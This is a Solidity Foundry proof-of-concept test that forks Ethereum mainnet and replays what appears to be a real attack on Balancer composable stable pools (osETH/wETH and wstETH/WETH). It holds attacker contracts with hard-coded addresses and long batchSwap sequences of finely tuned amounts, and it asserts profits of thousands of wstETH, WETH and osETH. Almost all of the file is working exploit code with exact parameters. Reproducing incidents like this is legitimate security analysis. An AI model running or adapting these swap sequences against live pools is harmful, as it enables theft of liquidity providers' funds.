
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 23717396;
    uint256 constant TX_TIMESTAMP = 1762156007;
    uint256 constant TX_BLOCK_NUMBER = 23717397;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        _etchAttackRuntime();
        attack = OurAttack(payable(ATTACK_CONTRACT));
        _etchChildRuntime();
        _bindAttackChild(attack, Addresses.attack_child);
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), Addresses.attack_child);
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _etchChildRuntime() internal {

        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
    }

    function _bindAttackChild(OurAttack attack, address attackChildAddress) internal {
        attack.bindAttackChild(attackChildAddress);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        profitLegs.push(
            ProfitLeg(
                Addresses.attack_contract,
                attack,
                Addresses.wstETH,
                "wstETH",
                4259843451780587743322,
                true,
                PROFIT_REPAIR_OBSERVE_ONLY,
                true
            )
        );
        profitLegs.push(
            ProfitLeg(
                Addresses.attack_contract,
                attack,
                Addresses.wstETH_WETH_BPT,
                "wstETH-WETH-BPT",
                20413668455251157822,
                true,
                PROFIT_REPAIR_OBSERVE_ONLY,
                true
            )
        );
        profitLegs.push(
            ProfitLeg(
                Addresses.attack_contract,
                attack,
                Addresses.WETH,
                "WETH",
                6587440315017497938362,
                true,
                PROFIT_REPAIR_OBSERVE_ONLY,
                true
            )
        );
        profitLegs.push(
            ProfitLeg(
                Addresses.attack_contract,
                attack,
                Addresses.osETH_wETH_BPT,
                "osETH/wETH-BPT",
                44154666355785411629,
                true,
                PROFIT_REPAIR_OBSERVE_ONLY,
                true
            )
        );
        profitLegs.push(
            ProfitLeg(
                Addresses.attack_contract,
                attack,
                Addresses.osETH,
                "osETH",
                6851122954235076557965,
                true,
                PROFIT_REPAIR_OBSERVE_ONLY,
                true
            )
        );
    }
}

contract OurAttack {
    AttackChild public attackChild;





    constructor() payable {
        _ctorBootstrap();
    }

    function _ctorBootstrap() internal {
        attackChild = AttackChild(payable(Addresses.attack_child));
    }

    function attack() external payable {
        _runAttack();
    }

    function executeSetup() external payable {
        _runAttack();
    }

    function _runAttack() internal {
        if (address(attackChild) == address(0)) _ctorBootstrap();
        executeAttackFlow();
    }

    function executeAttackFlow() public {
        bindRateQuoteChild();
        approveOsEthPool();
        updateOsEthRates();
        swapOsEthPool();
        approveWstEthPool();
        updateWstEthRates();
        swapWstEthPool();
        readWstEthPool();
    }

    function bindRateQuoteChild() internal {
        address rateQuoteChild = Addresses.attack_child;
        require(rateQuoteChild.code.length != 0, "attack child runtime missing");
        AttackChild(payable(Addresses.attack_child)).acceptQuoteSetup();
    }

    function approveOsEthPool() internal {
        IosETH_wETH_BPT(Addresses.osETH_wETH_BPT).getPoolId();
        IosETH_wETH_BPT(Addresses.osETH_wETH_BPT).getBptIndex();
        IBalancerVault(Addresses.BalancerVault)
            .getPoolTokens(bytes32(hex"dacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635"));
        IERC20Like(Addresses.WETH).approve(Addresses.BalancerVault, type(uint256).max);
        IERC20Like(Addresses.osETH_wETH_BPT).approve(Addresses.BalancerVault, type(uint256).max);
        IERC20Like(Addresses.osETH).approve(Addresses.BalancerVault, type(uint256).max);
    }

    function updateOsEthRates() internal {
        IosETH_wETH_BPT(Addresses.osETH_wETH_BPT).getScalingFactors();
        IosETH_wETH_BPT(Addresses.osETH_wETH_BPT).getRateProviders();
        IosETH_wETH_BPT(Addresses.osETH_wETH_BPT).updateTokenRateCache(Addresses.osETH);
        IosETH_wETH_BPT(Addresses.osETH_wETH_BPT).getAmplificationParameter();
    }

    function swapOsEthPool() internal {
        IosETH_wETH_BPT(Addresses.osETH_wETH_BPT).getSwapFeePercentage();
        IosETH_wETH_BPT(Addresses.osETH_wETH_BPT).getRate();
        IBalancerVault(Addresses.BalancerVault)
            .getPoolTokens(bytes32(hex"dacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635"));
        IosETH_wETH_BPT(Addresses.osETH_wETH_BPT).getActualSupply();
        IosETH_wETH_BPT(Addresses.osETH_wETH_BPT).getScalingFactors();
        IBalancerVault(Addresses.BalancerVault)
            .batchSwap(1, _osEthSwaps(), _osEthAssets(), _osEthFunds(), _osEthLimits(), 1762156007);
        IBalancerVault(Addresses.BalancerVault)
            .getPoolTokens(bytes32(hex"dacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635"));
        IosETH_wETH_BPT(Addresses.osETH_wETH_BPT).getRate();
        IwstETH_WETH_BPT(Addresses.wstETH_WETH_BPT).getPoolId();
    }

    function approveWstEthPool() internal {
        IwstETH_WETH_BPT(Addresses.wstETH_WETH_BPT).getBptIndex();
        IBalancerVault(Addresses.BalancerVault)
            .getPoolTokens(bytes32(hex"93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2"));
        IERC20Like(Addresses.wstETH).approve(Addresses.BalancerVault, type(uint256).max);
        IERC20Like(Addresses.wstETH_WETH_BPT).approve(Addresses.BalancerVault, type(uint256).max);
        IERC20Like(Addresses.WETH).approve(Addresses.BalancerVault, type(uint256).max);
    }

    function updateWstEthRates() internal {
        IwstETH_WETH_BPT(Addresses.wstETH_WETH_BPT).getScalingFactors();
        IwstETH_WETH_BPT(Addresses.wstETH_WETH_BPT).getRateProviders();
        IwstETH_WETH_BPT(Addresses.wstETH_WETH_BPT).updateTokenRateCache(Addresses.wstETH);
        IwstETH_WETH_BPT(Addresses.wstETH_WETH_BPT).getAmplificationParameter();
    }

    function swapWstEthPool() internal {
        IwstETH_WETH_BPT(Addresses.wstETH_WETH_BPT).getSwapFeePercentage();
        IwstETH_WETH_BPT(Addresses.wstETH_WETH_BPT).getRate();
        IBalancerVault(Addresses.BalancerVault)
            .getPoolTokens(bytes32(hex"93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2"));
        IwstETH_WETH_BPT(Addresses.wstETH_WETH_BPT).getActualSupply();
        IwstETH_WETH_BPT(Addresses.wstETH_WETH_BPT).getScalingFactors();
        IBalancerVault(Addresses.BalancerVault)
            .batchSwap(1, _wstEthSwaps(), _wstEthAssets(), _wstEthFunds(), _wstEthLimits(), 1762156007);
    }

    function readWstEthPool() internal view {
        IBalancerVault(Addresses.BalancerVault)
            .getPoolTokens(bytes32(hex"93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2"));
        IwstETH_WETH_BPT(Addresses.wstETH_WETH_BPT).getRate();
    }

    receive() external payable {}

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    function _osEthSwaps() internal pure returns (IBalancerVault.BatchSwapStep[] memory swapSteps) {
        swapSteps = new IBalancerVault.BatchSwapStep[](121);
        uint256 swapIndex;
        uint256[11] memory firstWethOutAmounts = [
            uint256(4873132999218408001625),
            uint256(48731329992184080017),
            uint256(487313299921840800),
            uint256(4873132999218408),
            uint256(48731329992184),
            uint256(487313299922),
            uint256(4873132999),
            uint256(48731330),
            uint256(487313),
            uint256(4873),
            uint256(50)
        ];
        uint256[11] memory firstOsEthOutAmounts = [
            uint256(6783065423678905706961),
            uint256(67830654236789057069),
            uint256(678306542367890571),
            uint256(6783065423678906),
            uint256(67830654236789),
            uint256(678306542367),
            uint256(6783065424),
            uint256(67830654),
            uint256(678307),
            uint256(6783),
            uint256(69)
        ];
        for (uint256 i = 0; i < 11; i++) {
            swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: bytes32(hex"dacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635"),
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: firstWethOutAmounts[i],
                userData: hex""
            });
            swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: bytes32(hex"dacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635"),
                assetInIndex: 1,
                assetOutIndex: 2,
                amount: firstOsEthOutAmounts[i],
                userData: hex""
            });
        }
        swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
            poolId: bytes32(hex"dacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635"),
            assetInIndex: 0,
            assetOutIndex: 2,
            amount: 66982,
            userData: hex""
        });
        swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
            poolId: bytes32(hex"dacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635"),
            assetInIndex: 0,
            assetOutIndex: 2,
            amount: 17,
            userData: hex""
        });
        uint256[29] memory osEthToWethAmounts = [
            uint256(891000),
            uint256(666000),
            uint256(495000),
            uint256(369000),
            uint256(270000),
            uint256(198000),
            uint256(160000),
            uint256(120000),
            uint256(89100),
            uint256(67500),
            uint256(52200),
            uint256(40500),
            uint256(31500),
            uint256(24300),
            uint256(19800),
            uint256(16200),
            uint256(12600),
            uint256(10800),
            uint256(9000),
            uint256(7371),
            uint256(6480),
            uint256(6075),
            uint256(5589),
            uint256(4779),
            uint256(4455),
            uint256(3969),
            uint256(3726),
            uint256(3645),
            uint256(3564)
        ];
        uint256[29] memory wethToOsEthAmounts = [
            uint256(5165),
            uint256(9016),
            uint256(12206),
            uint256(17532),
            uint256(14434),
            uint256(11377),
            uint256(22554),
            uint256(17663),
            uint256(12038),
            uint256(10414),
            uint256(9007),
            uint256(7867),
            uint256(6554),
            uint256(5472),
            uint256(4749),
            uint256(4397),
            uint256(3442),
            uint256(3296),
            uint256(2886),
            uint256(2286),
            uint256(2124),
            uint256(2014),
            uint256(1902),
            uint256(1730),
            uint256(1664),
            uint256(1562),
            uint256(1492),
            uint256(1484),
            uint256(1444)
        ];
        for (uint256 i = 0; i < 29; i++) {
            swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: bytes32(hex"dacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635"),
                assetInIndex: 2,
                assetOutIndex: 0,
                amount: osEthToWethAmounts[i],
                userData: hex""
            });
            swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: bytes32(hex"dacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635"),
                assetInIndex: 0,
                assetOutIndex: 2,
                amount: wethToOsEthAmounts[i],
                userData: hex""
            });
            swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: bytes32(hex"dacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635"),
                assetInIndex: 0,
                assetOutIndex: 2,
                amount: 17,
                userData: hex""
            });
        }
        swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
            poolId: bytes32(hex"dacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635"),
            assetInIndex: 2,
            assetOutIndex: 0,
            amount: 3564,
            userData: hex""
        });
        uint256[4] memory wethToBptAmounts =
            [uint256(10000), uint256(10000000000), uint256(10000000000000000), uint256(10000000000000000000000)];
        uint256[4] memory osEthToBptAmounts =
            [uint256(10000000), uint256(10000000000000), uint256(10000000000000000000), uint256(941319322493191942754)];
        for (uint256 i = 0; i < 4; i++) {
            swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: bytes32(hex"dacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635"),
                assetInIndex: 0,
                assetOutIndex: 1,
                amount: wethToBptAmounts[i],
                userData: hex""
            });
            swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: bytes32(hex"dacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635"),
                assetInIndex: 2,
                assetOutIndex: 1,
                amount: osEthToBptAmounts[i],
                userData: hex""
            });
        }
        swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
            poolId: bytes32(hex"dacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635"),
            assetInIndex: 0,
            assetOutIndex: 1,
            amount: 941319322493191942754,
            userData: hex""
        });
        require(swapIndex == 121, "osETH swap count");
        return swapSteps;
    }

    function _osEthAssets() internal pure returns (address[] memory) {
        return _addressArray3(Addresses.WETH, Addresses.osETH_wETH_BPT, Addresses.osETH);
    }

    function _osEthFunds() internal view returns (IBalancerVault.FundManagement memory) {
        return IBalancerVault.FundManagement({
            sender: address(this), fromInternalBalance: true, recipient: payable(address(this)), toInternalBalance: true
        });
    }

    function _osEthLimits() internal pure returns (int256[] memory batchSwapLimits) {
        batchSwapLimits = new int256[](3);
        batchSwapLimits[0] = int256(0x0400000000000000000000000000000000000000000000000000000000000000);
        batchSwapLimits[1] = int256(0x0400000000000000000000000000000000000000000000000000000000000000);
        batchSwapLimits[2] = int256(0x0400000000000000000000000000000000000000000000000000000000000000);
        return batchSwapLimits;
    }

    function _wstEthSwaps() internal pure returns (IBalancerVault.BatchSwapStep[] memory swapSteps) {
        swapSteps = new IBalancerVault.BatchSwapStep[](105);
        uint256 swapIndex;
        uint256[11] memory firstWstOutAmounts = [
            uint256(4228132612127881562978),
            uint256(42281326121278815630),
            uint256(422813261212788156),
            uint256(4228132612127882),
            uint256(42281326121278),
            uint256(422813261213),
            uint256(4228132612),
            uint256(42281326),
            uint256(422814),
            uint256(4228),
            uint256(43)
        ];
        uint256[11] memory firstWethOutAmounts = [
            uint256(1957287132413516128516),
            uint256(19572871324135161285),
            uint256(195728713241351613),
            uint256(1957287132413516),
            uint256(19572871324136),
            uint256(195728713241),
            uint256(1957287132),
            uint256(19572872),
            uint256(195728),
            uint256(1958),
            uint256(20)
        ];
        for (uint256 i = 0; i < 11; i++) {
            swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: bytes32(hex"93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2"),
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: firstWstOutAmounts[i],
                userData: hex""
            });
            swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: bytes32(hex"93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2"),
                assetInIndex: 1,
                assetOutIndex: 2,
                amount: firstWethOutAmounts[i],
                userData: hex""
            });
        }
        swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
            poolId: bytes32(hex"93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2"),
            assetInIndex: 2,
            assetOutIndex: 0,
            amount: 99999999995,
            userData: hex""
        });
        swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
            poolId: bytes32(hex"93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2"),
            assetInIndex: 2,
            assetOutIndex: 0,
            amount: 4,
            userData: hex""
        });
        uint256[24] memory wstToWethAmounts = [
            uint256(380000000000000),
            uint256(270000000000000),
            uint256(190000000000000),
            uint256(130000000000000),
            uint256(97000000000000),
            uint256(70000000000000),
            uint256(50000000000000),
            uint256(36000000000000),
            uint256(26000000000000),
            uint256(18000000000000),
            uint256(13000000000000),
            uint256(9500000000000),
            uint256(6210000000000),
            uint256(4900000000000),
            uint256(3500000000000),
            uint256(2500000000000),
            uint256(1700000000000),
            uint256(1200000000000),
            uint256(840000000000),
            uint256(600000000000),
            uint256(430000000000),
            uint256(310000000000),
            uint256(220000000000),
            uint256(160000000000)
        ];
        uint256[24] memory wethToWstAmounts = [
            uint256(6665),
            uint256(6528),
            uint256(2477),
            uint256(297),
            uint256(47546),
            uint256(301296),
            uint256(9419),
            uint256(3493484),
            uint256(1157),
            uint256(341),
            uint256(670),
            uint256(10201),
            uint256(81),
            uint256(9846),
            uint256(4546),
            uint256(17520),
            uint256(292),
            uint256(220),
            uint256(46307),
            uint256(37215),
            uint256(620177448),
            uint256(21591),
            uint256(671),
            uint256(7038)
        ];
        for (uint256 i = 0; i < 24; i++) {
            swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: bytes32(hex"93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2"),
                assetInIndex: 0,
                assetOutIndex: 2,
                amount: wstToWethAmounts[i],
                userData: hex""
            });
            swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: bytes32(hex"93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2"),
                assetInIndex: 2,
                assetOutIndex: 0,
                amount: wethToWstAmounts[i],
                userData: hex""
            });
            swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: bytes32(hex"93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2"),
                assetInIndex: 2,
                assetOutIndex: 0,
                amount: 4,
                userData: hex""
            });
        }
        swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
            poolId: bytes32(hex"93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2"),
            assetInIndex: 0,
            assetOutIndex: 2,
            amount: 110000000000,
            userData: hex""
        });
        uint256[4] memory wstToBptAmounts =
            [uint256(10000), uint256(10000000000), uint256(10000000000000000), uint256(3418009626758926269710)];
        uint256[4] memory wethToBptAmounts = [
            uint256(10000000), uint256(10000000000000), uint256(10000000000000000000), uint256(3418009626758926269710)
        ];
        for (uint256 i = 0; i < 4; i++) {
            swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: bytes32(hex"93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2"),
                assetInIndex: 0,
                assetOutIndex: 1,
                amount: wstToBptAmounts[i],
                userData: hex""
            });
            swapSteps[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: bytes32(hex"93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2"),
                assetInIndex: 2,
                assetOutIndex: 1,
                amount: wethToBptAmounts[i],
                userData: hex""
            });
        }
        require(swapIndex == 105, "wstETH swap count");
        return swapSteps;
    }

    function _wstEthAssets() internal pure returns (address[] memory) {
        return _addressArray3(Addresses.wstETH, Addresses.wstETH_WETH_BPT, Addresses.WETH);
    }

    function _wstEthFunds() internal view returns (IBalancerVault.FundManagement memory) {
        return IBalancerVault.FundManagement({
            sender: address(this), fromInternalBalance: true, recipient: payable(address(this)), toInternalBalance: true
        });
    }

    function _wstEthLimits() internal pure returns (int256[] memory batchSwapLimits) {
        batchSwapLimits = new int256[](3);
        batchSwapLimits[0] = int256(0x0400000000000000000000000000000000000000000000000000000000000000);
        batchSwapLimits[1] = int256(0x0400000000000000000000000000000000000000000000000000000000000000);
        batchSwapLimits[2] = int256(0x0400000000000000000000000000000000000000000000000000000000000000);
        return batchSwapLimits;
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

contract AttackChild {
    receive() external payable {}

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(address => uint256) private _balancerVaultPreBalance;

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function acceptQuoteSetup() public {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attacker_eoa = 0x506D1f9EFe24f0d47853aDca907EB8d89AE03207;
    address internal constant attack_contract = 0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d;
    address internal constant attack_child = 0x679B362B9f38BE63FbD4A499413141A997eb381e;
    address internal constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address internal constant wstETH_WETH_BPT = 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant ProtocolFeesCollector = 0xce88686553686DA562CE7Cea497CE749DA109f9F;
    address internal constant osETH_wETH_BPT = 0xDACf5Fa19b1f720111609043ac67A9818262850c;
    address internal constant osETH = 0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38;
}

interface IBalancerVault {
    struct BatchSwapStep {
        bytes32 poolId;
        uint256 assetInIndex;
        uint256 assetOutIndex;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    function batchSwap(
        uint8,
        BatchSwapStep[] calldata,
        address[] calldata,
        FundManagement calldata,
        int256[] calldata,
        uint256
    ) external;
    function getPoolTokens(bytes32) external view;
}

interface IosETH_wETH_BPT {
    function getActualSupply() external view returns (uint256);
    function getAmplificationParameter() external view;
    function getBptIndex() external view returns (uint256);
    function getPoolId() external view returns (uint256);
    function getRate() external view returns (uint256);
    function getRateProviders() external view;
    function getScalingFactors() external view;
    function getSwapFeePercentage() external view returns (uint256);
    function updateTokenRateCache(address) external;
}

interface IwstETH_WETH_BPT {
    function getActualSupply() external view returns (uint256);
    function getAmplificationParameter() external view;
    function getBptIndex() external view returns (uint256);
    function getPoolId() external view returns (uint256);
    function getRate() external view returns (uint256);
    function getRateProviders() external view;
    function getScalingFactors() external view;
    function getSwapFeePercentage() external view returns (uint256);
    function updateTokenRateCache(address) external;
}

function _addressArray3(address a0, address a1, address a2) pure returns (address[] memory out) {
    out = new address[](3);
    out[0] = a0;
    out[1] = a1;
    out[2] = a2;
}
